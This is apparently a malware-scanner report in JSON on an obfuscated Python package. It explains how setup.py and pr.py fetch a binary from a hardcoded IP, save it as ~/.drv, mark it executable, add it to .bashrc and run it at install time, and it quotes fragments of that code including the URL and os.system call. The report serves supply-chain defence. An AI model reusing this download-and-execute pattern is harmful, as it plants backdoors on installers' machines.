{
  "package_name": "b956a1e64aef442d7b4c713cfde28c256ce97899",
  "total_matches": 4,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/easyinstall/pr.py",
      "file_name": "pr.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple hallmarks of malicious behavior: (1) It downloads a file from a hardcoded, suspicious external IP address (http://145.249.104.71/out) using urllib2, (2) writes the downloaded content as a file named '.drv' in the user's home directory, (3) sets the file as executable, and (4) appends a command to the user's .bashrc to execute this file on shell startup, establishing persistence. The code uses obfuscated variable names, lacks user notification or consent, and provides no legitimate business logic or documentation. The combination of remote payload download, execution permission setting, and persistence via .bashrc modification is a classic malware pattern, strongly associated with Linux backdoors, trojans, and supply chain attacks. There is no evidence of benign intent or user-facing functionality.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "10",
          "type_description": "download-executable: found 2 source code matches",
          "code_snippet": "gavtZTrgEdKLOHfiYWRjwdakthgynfDM = open (AkYpDQpClVAhdkdRJZHGTkNOgiJUlhTl, \"wb\")\ngavtZTrgEdKLOHfiYWRjwdakthgynfDM.write (QOevuhZAUxMCGaDUIiShszNPnsSaYLzU.read ())\ngavtZTrgEdKLOHfiYWRjwdakthgynfDM.close ()\n....S_IEXEC)",
          "full_match": "* This package is downloading making executable a remote binary at easyinstall/pr.py:10",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/easyinstall/pr.py",
          "relative_path": "easyinstall/pr.py"
        },
        {
          "line_number": "5",
          "type_description": "shady-links: found 1 source code matches",
          "code_snippet": "aKJTiYbuDWtWbxTjiTDwqwdtzhHtHSvz = \"http://145.249.104.71/out\"",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at easyinstall/pr.py:5",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/easyinstall/pr.py",
          "relative_path": "easyinstall/pr.py"
        }
      ]
    },
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/setup.py",
      "file_name": "setup.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple critical indicators of malicious behavior, consistent with known supply chain attacks in the Python ecosystem. Specifically: (1) It downloads a binary payload from a hardcoded, suspicious IP address (145.249.104.71) using either urllib2 or http.client, depending on Python version. (2) The downloaded content is written as a hidden file named '.drv' in the user's home directory, and its permissions are set to executable. (3) The code appends a command to the user's .bashrc file to ensure '.drv' is executed on every shell startup, establishing persistence. (4) It immediately executes the downloaded '.drv' binary using os.system, enabling arbitrary code execution from an untrusted, remote source. (5) All of these actions are performed automatically during package installation, without user consent, logging, or validation. (6) The code is heavily obfuscated with meaningless variable names, further indicating an attempt to evade detection. These behaviors are exclusively observed in malware samples and are never present in benign Python packages. The combination of remote payload download, execution, and persistence mechanisms during installation is a hallmark of malicious supply chain attacks.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "22",
          "type_description": "download-executable: found 2 source code matches",
          "code_snippet": "gavtZTrgEdKLOHfiYWRjwdakthgynfDM = open (AkYpDQpClVAhdkdRJZHGTkNOgiJUlhTl, \"wb\")\ngavtZTrgEdKLOHfiYWRjwdakthgynfDM.write (QOevuhZAUxMCGaDUIiShszNPnsSaYLzU)\ngavtZTrgEdKLOHfiYWRjwdakthgynfDM.clos....S_IEXEC)",
          "full_match": "* This package is downloading making executable a remote binary at setup.py:22",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "30",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system (\"~/.drv\")",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:30",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/b956a1e64aef442d7b4c713cfde28c256ce97899/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}